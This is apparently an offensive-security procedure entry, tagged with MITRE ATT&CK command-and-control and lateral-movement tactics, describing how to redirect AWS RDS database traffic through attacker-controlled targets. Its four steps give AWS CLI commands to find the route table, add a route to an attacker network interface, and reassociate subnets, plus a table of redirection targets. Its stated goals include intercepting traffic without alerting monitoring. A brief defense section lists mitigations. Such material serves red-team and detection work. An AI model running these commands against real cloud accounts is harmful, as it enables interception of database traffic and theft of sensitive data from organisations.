---
id: 1889f531-e49c-4eab-984b-95f56ecd5500
name: Modify-AWS-VPC-Route-Tables-for-RDS-Traffic-Redirection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:14.208798+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Connection Proxy|T1090 - Connection Proxy]]'
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/RDS - Relational Database Service]]'
  - '[[tags/Routing Tables]]'
  - aws
  - vpc
  - traffic-redirection
commands:
  - '[[commands/aws-ec2-describe-route-tables]]'
  - '[[commands/aws-ec2-create-route]]'
platforms:
  - AWS
tools:
  - '[[tools/AWS-CLI]]'
validated: true
---

# Modify-AWS-VPC-Route-Tables-for-RDS-Traffic-Redirection

## Summary

This procedure details how to modify AWS VPC route tables associated with RDS instances to redirect traffic to attacker-controlled targets, such as a malicious NAT gateway or network interface. By altering destination and target rules, attackers can proxy connections, bypass security controls, and intercept sensitive data in transit to RDS databases, facilitating lateral movement or command and control within a compromised AWS environment.

## Description

In AWS, VPC route tables control traffic flow by defining rules with destinations (e.g., IP ranges or CIDR blocks) and targets (e.g., internet gateways, NAT gateways). For RDS instances, which reside in VPCs, modifying these tables allows redirection of database traffic to unauthorized endpoints. This technique is useful post-compromise when an attacker has IAM permissions to manage EC2 resources. For example, redirecting 10.0.0.0/16 traffic (VPC CIDR) from 'local' to a controlled 'eni' (elastic network interface) enables man-in-the-middle attacks on RDS queries. Prerequisites include AWS credentials with ec2:DescribeRouteTables, ec2:CreateRoute, and ec2:ReplaceRouteTableAssociation permissions. This maps to MITRE ATT&CK for cloud environments where route manipulation supports proxying and remote access.

## Requirements

1. AWS credentials with EC2 full access or specific permissions (ec2:DescribeRouteTables, ec2:CreateRoute, ec2:ReplaceRouteTableAssociation).
2. Knowledge of the target VPC ID, route table ID, and RDS subnet associations.
3. Installed AWS CLI configured with access keys.
4. Attacker-controlled target resources (e.g., EC2 instance ENI or NAT gateway ID).
5. Awareness of VPC CIDR blocks to avoid disrupting legitimate traffic.

## Defense

- Implement least-privilege IAM policies to restrict route table modifications (e.g., deny ec2:CreateRoute for non-admin roles).
- Enable AWS CloudTrail logging for EC2 API calls and monitor for unauthorized route changes via Amazon GuardDuty or custom CloudWatch alarms.
- Use VPC Flow Logs to detect anomalous traffic patterns redirected to unexpected targets.
- Segment RDS instances into isolated subnets with network ACLs that block unauthorized routing.

## Objectives

1. Identify the route table associated with the RDS instance's subnet.
2. Add a new route to redirect traffic to an attacker-controlled target.
3. Verify the redirection enables traffic interception without alerting monitoring.
4. Maintain persistence by associating the modified table with RDS subnets.

## Instructions

### Step 1: Identify the VPC Route Table for RDS Subnet

**Context**: First, retrieve details of route tables in the target VPC to identify the one associated with the RDS instance's subnet. This ensures you target the correct table without affecting other resources.

**Command** ([[commands/aws-ec2-describe-route-tables]]):
```bash
aws ec2 describe-route-tables --vpc-id vpc-0123456789abcdef0 --query 'RouteTables[*].[RouteTableId,Associations[].SubnetId,Routes[]]' --output table
```

> This command lists route tables, their associated subnets (filter for RDS subnet ID), and existing routes. Look for the main route table or custom one linked to the RDS subnet. If the RDS is in subnet subnet-0123456789abcdef0, confirm the association here. Expected output includes table IDs and current routes like local 10.0.0.0/16 targeting 'local'.

### Step 2: Create a New Route for Traffic Redirection

**Context**: Add a route to redirect specific traffic (e.g., RDS-bound CIDR) to your controlled target, such as an ENI on a compromised EC2 instance acting as a proxy. Choose destination/target pairs based on the flow: e.g., destination '10.0.1.0/24' (RDS subnet) to target 'eni-0123456789abcdef0' (attacker ENI). This proxies queries to RDS while allowing interception.

**Command** ([[commands/aws-ec2-create-route]]):
```bash
aws ec2 create-route --route-table-id rtb-0123456789abcdef0 --destination-cidr-block 10.0.1.0/24 --network-interface-id eni-0123456789abcdef0
```

> Replace placeholders with actual IDs. This adds a route for the specified destination CIDR to the ENI target. For other targets: use --gateway-id igw-xxx for internet, --nat-gateway-id nat-xxx for NAT, etc. Verify with describe-route-tables. If the destination is 'local', it defaults to VPC internals; override to eni/vgw for redirection. Expected output: {"Return": true} on success, confirming the route is active.

### Step 3: Associate Route Table with RDS Subnet if Needed

**Context**: If the route table isn't already associated with the RDS subnet, replace the association to enforce the new rules. This ensures all traffic from the RDS subnet follows the redirected path.

**Command** ([[commands/aws-ec2-associate-route-table]]):
```bash
aws ec2 replace-route-table-association --association-id rta-0123456789abcdef0 --route-table-id rtb-0123456789abcdef0
```

> Use the association ID from Step 1. This updates the subnet to use the modified table. Expected output: {"NewAssociationId": "rta-newid", "Return": true}. Test redirection by pinging or querying RDS from within the VPC and monitoring your target ENI for traffic.

### Step 4: Reference Destination and Target Options

**Context**: Select appropriate destination/target pairs based on the attack goal. Destinations define where traffic is headed (CIDR or 'local'), targets define the egress path.

Use this reference table for common configurations:

| Destination | Target Example | Use Case |
|-------------|----------------|----------|
| local (VPC CIDR, e.g., 10.0.0.0/16) | VPC Internal IPs | Default intra-VPC routing; override for proxying. |
| 0.0.0.0/0 (any IP) | igw-xxx (Internet Gateway) | Redirect outbound to internet-controlled server. |
| RDS Subnet CIDR (e.g., 10.0.1.0/24) | nat-xxx (NAT Gateway) | Proxy RDS access through controlled NAT. |
| Peer CIDR | pcx-xxx (VPC Peering) | Lateral to peered VPCs via attacker proxy. |
| Specific IP | vpce-xxx (VPC Endpoint) | Redirect to controlled endpoint service. |
| VPN CIDR | vgw-xxx (VPN Gateway) | Tunnel RDS traffic via attacker VPN. |
| Custom CIDR | eni-xxx (Network Interface) | Intercept via EC2 ENI on compromised instance. |

> Integrate into create-route command, e.g., --destination-cidr-block for IP ranges, --network-interface-id for eni targets. Success: Traffic flows to your target, verifiable via VPC Flow Logs or tcpdump on the ENI instance.
